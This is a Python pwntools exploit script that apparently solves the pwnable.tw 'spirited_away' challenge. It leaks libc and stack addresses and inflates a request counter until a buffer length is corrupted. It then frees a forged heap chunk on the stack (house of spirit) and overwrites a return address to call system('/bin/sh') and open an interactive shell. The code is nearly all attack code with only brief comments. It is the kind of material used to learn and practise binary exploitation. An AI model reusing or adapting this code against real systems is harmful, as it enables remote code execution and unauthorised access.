from pwn import *

local = False

if local:
	r = process("./spirited_away")
	#gdb.attach(r)
	_IO_file_sync_off = 0x000681d0
	sys_off = 0x3ada0
	binsh_off = 0x15ba0b
else:
	r = remote('chall.pwnable.tw', 10204)
	_IO_file_sync_off = 0x000675e0
	sys_off = 0x3a940
	binsh_off = 0x158e8b

def setup(name, age, why, comment):
	r.recvuntil("Please enter your name:")
	r.send(name)
	#r.sendafter("Please enter your name:", name)
	r.sendlineafter("Please enter your age:", str(age))
	r.sendafter("Why did you came to see this movie?", why)
	r.sendafter("Please enter your comment:", comment)

print "This exploit need to set up 100 requests"

# leak libc base
why = "bbbb"*5 + "aaaa"
comment = " "
setup("sona", "1", why, comment)
print "1"

result = r.recvuntil("<y/n>:")
result = result.split("aaaa")[1][:4]
result = u32(result)
base = result - _IO_file_sync_off - 7
sys_addr = base + sys_off
binsh_addr = base + binsh_off

r.sendline("Y")

# leak stack addr
why = "a"*0x4f + "b"
setup("karthus", "1", why, comment)
print "2"
result = r.recvuntil("<y/n>:")
result = result.split("b")[1][:4]
ebp_survey = u32(result)
target = ebp_survey - 0x68

r.sendline("Y")

# make 100 request to overwrite nbytes variable
# while 10->99 requests, nbytes variable = 0, so name and comment must be "\n"  
why = "\x00"*0x50
for i in range(3, 101):
	print i
	setup("\n", 1, why, "\n")
	r.recvuntil("<y/n>:")
	r.sendline("Y")

# when 100 requested, nbytes = 0x6e -> overwrite buf by target
# target point to &why+8
# setup why to free target
comment = "c"*0x50 + p32(101) + p32(target)
# heap vulnerable, set up like this to avoid error when free
why = p32(0) + p32(0x41) + "w"*0x38 + p32(0) + p32(0x31)
setup("karthus", 101, why, comment)	

# make free when "y"
r.recvuntil("<y/n>:")
r.sendline("y")

# malloc to our target, and we can overwrite return address
name = "X"*0x4c + p32(sys_addr) + p32(0) + p32(binsh_addr)
setup(name, 102, "\n", "lux")

r.recvuntil("<y/n>:")
r.sendline("N")
r.recv()

r.interactive()

